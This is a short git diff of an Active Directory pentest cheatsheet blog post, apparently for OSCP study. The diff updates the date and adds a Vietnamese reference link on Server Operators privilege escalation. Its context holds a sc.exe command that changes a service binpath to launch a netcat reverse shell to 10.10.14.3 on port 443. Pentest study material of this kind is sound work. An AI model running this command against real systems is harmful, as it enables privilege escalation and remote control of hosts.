@@ -1,7 +1,7 @@
 ---
 title : "AD-Cheatsheet"
 author: imdang 🤞🤞
-date: 2024-10-22 11:30:00 +0800
+date: 2024-12-18 11:30:00 +0800
 categories: [Cheatsheet]
 tags: [crackmapexec, winrm, AD, Active Directory, OSCP]
 ---
@@ -52,6 +52,8 @@ whoami /priv
 ### Server Operators 
 
 - Can edit and run service
+
+Tham khảo: https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/
 
 ```shell
 PS C:\prog> sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\prog\nc64.exe -e cmd 10.10.14.3 443"
